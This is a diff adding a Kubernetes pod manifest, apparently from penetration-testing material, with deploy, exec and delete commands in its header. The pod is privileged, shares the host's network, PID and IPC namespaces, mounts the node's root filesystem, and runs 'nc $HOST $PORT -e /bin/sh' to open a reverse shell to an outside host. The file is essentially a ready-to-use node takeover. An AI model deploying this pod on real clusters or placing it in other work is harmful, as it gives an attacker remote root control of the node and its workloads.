@@ -1,0 +1,32 @@
+###########################################################
+## Deploy: kubectl -n [namespace] apply -f pod-everything-allowed.yaml 
+## Access: kubectl -n [namespace] exec -it pod-everything-allowed -- bash
+## Remove: kubectl -n [namespace] delete -f pod-everything-allowed.yaml 
+## Credit: Adapted from https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/
+###########################################################
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-everything-allowed
+  labels:
+    app: everything-allowed
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: everything-allowed
+    image: busybox
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
+  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
+  #nodeName: k8s-master
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
